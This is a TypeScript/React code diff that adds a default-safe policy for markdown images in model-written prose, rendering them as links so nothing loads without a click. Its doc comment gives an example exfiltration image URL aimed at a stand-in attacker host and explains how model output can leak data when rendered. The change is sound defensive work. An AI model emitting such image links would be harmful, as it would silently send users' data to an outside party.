@@ -62,9 +62,27 @@ export type ResolveUrl = (url: string) => string | undefined;
  */
 export type ResolveShareUrl = (url: string) => Promise<string | undefined>;
 
+/**
+ * What a `prose` value's markdown images do — and the default is not to load
+ * them.
+ *
+ * A prose value is MODEL OUTPUT, and `![](https://attacker/collect?…)` in it is
+ * a request the browser makes the moment the result is painted, before anyone
+ * has read a word. Nothing was clicked and nothing was consented to, so the
+ * exfiltration channel is open by default in a view whose whole content is
+ * untrusted. `'link'` closes it: the image renders as a link carrying its alt
+ * text, so nothing the model wrote is lost and the fetch waits for a click.
+ *
+ * `'load'` is the opt-in, for a host that knows where its prose images come
+ * from — a method that composes a report out of its own stored figures, say.
+ * Only `http:` and `https:` are ever painted or linked either way.
+ */
+export type ProseImages = 'link' | 'load';
+
 interface ResultEnv {
   resolveUrl?: ResolveUrl;
   resolveShareUrl?: ResolveShareUrl;
+  proseImages?: ProseImages;
 }
 
 const ResultEnvContext = createContext<ResultEnv>({});
@@ -72,9 +90,13 @@ const ResultEnvContext = createContext<ResultEnv>({});
 export function ResultEnvProvider({
   resolveUrl,
   resolveShareUrl,
+  proseImages,
   children,
 }: ResultEnv & { children: ReactNode }) {
-  const env = useMemo(() => ({ resolveUrl, resolveShareUrl }), [resolveUrl, resolveShareUrl]);
+  const env = useMemo(
+    () => ({ resolveUrl, resolveShareUrl, proseImages }),
+    [resolveUrl, resolveShareUrl, proseImages],
+  );
   return <ResultEnvContext value={env}>{children}</ResultEnvContext>;
 }
 
@@ -84,8 +106,9 @@ export function ResultEnvProvider({
  * Every file arm calls this rather than reading the context and remembering to
  * apply it: `useResolvedUrl(url)` is the URL to actually use, and a component
  * that forgets to call it is the bug this shape prevents. An unresolvable
- * reference comes back as the reference, so the arms' existing
- * `isViewableUrl` check still decides whether it can be linked or only named.
+ * reference comes back as the reference, so the arms' own `viewableUrl` check
+ * still decides whether it can be linked or only named — and, when it can, what
+ * string they use.
  */
 export function useResolvedUrl(url: string): string {
   return use(ResultEnvContext).resolveUrl?.(url) ?? url;
@@ -99,4 +122,9 @@ export function useResolveUrl(): ResolveUrl | undefined {
 /** The share-URL minter, when the host supplies one. */
 export function useResolveShareUrl(): ResolveShareUrl | undefined {
   return use(ResultEnvContext).resolveShareUrl;
+}
+
+/** The prose-image policy, defaulted to the safe answer for a host that stated none. */
+export function useProseImages(): ProseImages {
+  return use(ResultEnvContext).proseImages ?? 'link';
 }
